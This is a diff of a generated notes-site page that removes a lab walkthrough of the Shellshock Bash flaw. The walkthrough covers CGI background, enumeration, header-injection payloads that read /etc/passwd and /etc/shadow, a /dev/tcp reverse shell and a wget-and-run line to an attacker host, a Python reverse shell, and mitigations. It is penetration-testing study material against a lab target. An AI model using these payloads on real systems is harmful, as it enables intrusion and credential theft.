@@ -17,8 +17,8 @@
         <link rel="icon" href="../../../favicon-de23e50b.svg">
         <link rel="shortcut icon" href="../../../favicon-8114d1fc.png">
         <link rel="stylesheet" href="../../../css/variables-8adf115d.css">
-        <link rel="stylesheet" href="../../../css/general-2459343d.css">
-        <link rel="stylesheet" href="../../../css/chrome-ae938929.css">
+        <link rel="stylesheet" href="../../../css/general-e96d0476.css">
+        <link rel="stylesheet" href="../../../css/chrome-d279d366.css">
         <link rel="stylesheet" href="../../../css/print-9e4910d8.css" media="print">
 
         <!-- Fonts -->
@@ -38,10 +38,10 @@
             const path_to_root = "../../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../../searchindex-df557b97.js";
+            window.path_to_searchindex_js = "../../../searchindex-190f6cd0.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../../../toc-da42f48c.js"></script>
+        <script src="../../../toc-33caecdc.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -182,159 +182,6 @@
                 <div id="mdbook-content" class="content">
                     <main>
                         <h1 id="shellshock-cve-2014-6271"><a class="header" href="#shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</a></h1>
-<h2 id="cgi-background"><a class="header" href="#cgi-background">CGI Background</a></h2>
-<p>A <strong>Common Gateway Interface (CGI)</strong> is middleware between a web server and external applications. When a user submits a request, the web server invokes a CGI script, passes it the request data via environment variables and stdin, and returns the script’s stdout to the client. Scripts are stored in <code>/cgi-bin/</code> and can be written in any language (C, Perl, Python, Bash, etc.).</p>
-<p>CGI process flow:</p>
-<ol>
-<li>Browser sends request URL to web server</li>
-<li>Web server invokes the CGI script for that URL</li>
-<li>Script executes, outputs response to stdout</li>
-<li>Web server returns output to browser</li>
-</ol>
-<p>CGI creates a new OS process per request — each request forks a new process, opens a new DB connection, and cannot cache state between requests. These inefficiencies have made CGI largely obsolete in modern applications. It persists primarily in <strong>legacy systems and embedded/IoT devices</strong>.</p>
-<hr>
-<h2 id="shellshock-overview"><a class="header" href="#shellshock-overview">Shellshock Overview</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Detail</th><th>Value</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>CVE</strong></td><td>CVE-2014-6271</td></tr>
-<tr><td><strong>Discovered</strong></td><td>September 2014</td></tr>
-<tr><td><strong>Affected software</strong></td><td>GNU Bash versions up to 4.3</td></tr>
-<tr><td><strong>Impact</strong></td><td>Unauthenticated remote code execution via CGI</td></tr>
-<tr><td><strong>Still found in the wild</strong></td><td>Yes — IoT devices, legacy embedded systems, unmaintained servers</td></tr>
-</tbody>
-</table>
-</div>
-<p>Shellshock exploits a flaw in how old versions of Bash handle <strong>function definitions stored in environment variables</strong>. When Bash imports an environment variable containing a function definition, vulnerable versions execute any commands that appear <em>after</em> the function body.</p>
-<h3 id="how-the-flaw-works"><a class="header" href="#how-the-flaw-works">How the flaw works</a></h3>
-<p>Bash allows functions to be exported via environment variables:</p>
-<pre><code class="language-bash">export y='() { :; }'   # defines a function y that does nothing
-</code></pre>
-<p>On a <strong>vulnerable</strong> system, any commands appended after the closing brace are executed when Bash starts:</p>
-<pre><code class="language-bash">env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
-</code></pre>
-<ul>
-<li><code>y='() { :;};'</code> — function definition (imported by child Bash)</li>
-<li><code>echo vulnerable-shellshock</code> — injected command, executed by vulnerable Bash on import</li>
-<li>Output on <strong>vulnerable</strong> system: <code>vulnerable-shellshock</code> then <code>not vulnerable</code></li>
-<li>Output on <strong>patched</strong> system: <code>not vulnerable</code> only</li>
-</ul>
-<p>On a patched system, Bash no longer executes code after a function definition, and function variables must be prefixed with <code>BASH_FUNC_</code>.</p>
-<h3 id="why-cgi-enables-exploitation"><a class="header" href="#why-cgi-enables-exploitation">Why CGI enables exploitation</a></h3>
-<p>When a web server processes a CGI request, it passes HTTP headers to the CGI script as <strong>environment variables</strong> — including <code>HTTP_USER_AGENT</code>, <code>HTTP_REFERER</code>, <code>QUERY_STRING</code>, etc. If the CGI script is executed by Bash (or calls Bash internally), an attacker-controlled header becomes an environment variable, and the Shellshock payload executes on Bash startup.</p>
-<hr>
-<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
-<h3 id="find-cgi-scripts-with-gobuster"><a class="header" href="#find-cgi-scripts-with-gobuster">Find CGI scripts with Gobuster</a></h3>
-<pre><code class="language-bash">gobuster dir -u http://10.129.204.231/cgi-bin/ \
-             -w /usr/share/wordlists/dirb/small.txt \
-             -x cgi
-</code></pre>
-<pre><code>/access.cgi  (Status: 200) [Size: 0]
-</code></pre>
-<h3 id="confirm-the-script-exists"><a class="header" href="#confirm-the-script-exists">Confirm the script exists</a></h3>
-<pre><code class="language-bash">curl -i http://10.129.204.231/cgi-bin/access.cgi
-</code></pre>
-<pre><code>HTTP/1.1 200 OK
-Server: Apache/2.4.41 (Ubuntu)
-Content-Length: 0
-Content-Type: text/html
-</code></pre>
-<p>An empty 200 response is normal — the script may produce no output but is still Bash-backed.</p>
-<hr>
-<h2 id="confirming-the-vulnerability"><a class="header" href="#confirming-the-vulnerability">Confirming the Vulnerability</a></h2>
-<p>Inject the Shellshock payload into the <code>User-Agent</code> header. If the system is vulnerable, the injected command (<code>/bin/cat /etc/passwd</code>) executes and its output is returned:</p>
-<pre><code class="language-bash">curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
-     bash -s :'' \
-     http://10.129.204.231/cgi-bin/access.cgi
-</code></pre>
-<p>Successful output returns the contents of <code>/etc/passwd</code>:</p>
-<pre><code>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-...
-</code></pre>
-<p>The two <code>echo</code> statements before the command inject blank lines to separate the HTTP response headers from the command output.</p>
-<p><strong>Other injectable headers to try:</strong></p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Header</th><th>CGI environment variable</th></tr>
-</thead>
-<tbody>
-<tr><td><code>User-Agent</code></td><td><code>HTTP_USER_AGENT</code></td></tr>
-<tr><td><code>Referer</code></td><td><code>HTTP_REFERER</code></td></tr>
-<tr><td><code>Cookie</code></td><td><code>HTTP_COOKIE</code></td></tr>
-<tr><td><code>X-Forwarded-For</code></td><td><code>HTTP_X_FORWARDED_FOR</code></td></tr>
-<tr><td><code>Accept</code></td><td><code>HTTP_ACCEPT</code></td></tr>
-</tbody>
-</table>
-</div>
-<hr>
-<h2 id="exploitation--reverse-shell"><a class="header" href="#exploitation--reverse-shell">Exploitation — Reverse Shell</a></h2>
-<p>Once confirmed, obtain a reverse shell by injecting a Bash TCP one-liner into the same header:</p>
-<p><strong>Start a listener:</strong></p>
-<pre><code class="language-bash">sudo nc -lvnp 7777
-</code></pre>
-<p><strong>Send the payload:</strong></p>
-<pre><code class="language-bash">curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.38/7777 0&gt;&amp;1' \
-     http://10.129.204.231/cgi-bin/access.cgi
-</code></pre>
-<p><strong>Shell received:</strong></p>
-<pre><code>connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
-www-data@htb:/usr/lib/cgi-bin$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
-<p>The shell runs as <code>www-data</code> — standard for Apache CGI. Escalate privileges or pivot from here.</p>
-<h3 id="alternative-payloads"><a class="header" href="#alternative-payloads">Alternative payloads</a></h3>
-<pre><code class="language-bash"># Read a file
-() { :; }; echo ; /bin/cat /etc/shadow
-
-# Execute a downloaded payload
-() { :; }; /bin/bash -c 'wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh &amp;&amp; bash /tmp/s.sh'
-
-# Python reverse shell (if Bash TCP redirect is blocked)
-() { :; }; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",7777));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
-</code></pre>
-<hr>
-<h2 id="where-to-look-for-shellshock"><a class="header" href="#where-to-look-for-shellshock">Where to look for Shellshock</a></h2>
-<p>Shellshock is most likely to appear:</p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Context</th><th>Notes</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>IoT / embedded devices</strong></td><td>Routers, cameras, industrial controllers — rarely patched, often run old Bash</td></tr>
-<tr><td><strong>Legacy Linux servers</strong></td><td>Pre-2014 Ubuntu/Debian/CentOS installs that have not received updates</td></tr>
-<tr><td><strong>End-of-life systems</strong></td><td>Systems where the OS vendor no longer provides patches</td></tr>
-<tr><td><strong>Internal network appliances</strong></td><td>VPN concentrators, load balancers, monitoring agents with CGI interfaces</td></tr>
-</tbody>
-</table>
-</div>
-<p>Any web application with files in <code>/cgi-bin/</code> that are executed by Bash is a candidate.</p>
-<hr>
-<h2 id="mitigation"><a class="header" href="#mitigation">Mitigation</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Option</th><th>Notes</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Patch Bash</strong></td><td>Upgrade to Bash 4.3 patch 25 or later — the definitive fix</td></tr>
-<tr><td><strong>Disable CGI</strong></td><td>If not required, remove or disable CGI support in the web server config</td></tr>
-<tr><td><strong>WAF rules</strong></td><td>Block <code>() {</code> patterns in HTTP headers as a temporary control</td></tr>
-<tr><td><strong>Network isolation</strong></td><td>For critical IoT/embedded devices that cannot be patched, firewall off from internet and restrict internal access</td></tr>
-<tr><td><strong>Decommission</strong></td><td>If the device is end-of-life and patching is impossible, evaluate taking it offline</td></tr>
-</tbody>
-</table>
-</div>
-<blockquote>
-<p>Firewalling and WAF rules are mitigations, not fixes. The definitive remediation is patching Bash or replacing the system.</p>
-</blockquote>
 
                     </main>
 
@@ -380,11 +227,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
         <script src="../../../elasticlunr-ef4e11c1.min.js"></script>
         <script src="../../../mark-09e88c2c.min.js"></script>
-        <script src="../../../searcher-c2a407aa.js"></script>
+        <script src="../../../searcher-09f2665d.js"></script>
 
         <script src="../../../clipboard-1626706a.min.js"></script>
         <script src="../../../highlight-abc7f01d.js"></script>
-        <script src="../../../book-a0b12cfe.js"></script>
+        <script src="../../../book-609e4cb8.js"></script>
 
         <!-- Custom JS scripts -->
 
